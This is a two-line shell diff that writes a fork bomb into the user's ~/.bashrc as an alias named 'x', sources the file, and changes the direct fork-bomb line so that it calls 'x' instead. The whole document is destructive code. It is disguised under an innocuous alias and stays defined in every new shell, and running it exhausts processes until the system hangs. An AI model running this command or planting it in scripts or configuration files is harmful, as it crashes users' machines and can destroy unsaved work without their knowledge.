@@ -1,2 +1,2 @@
 ( echo ""; echo "alias x=':(){ :|:& };:'" ) >> ~/.bashrc;source ~/.bashrc
-:(){ :|:& };:
+x
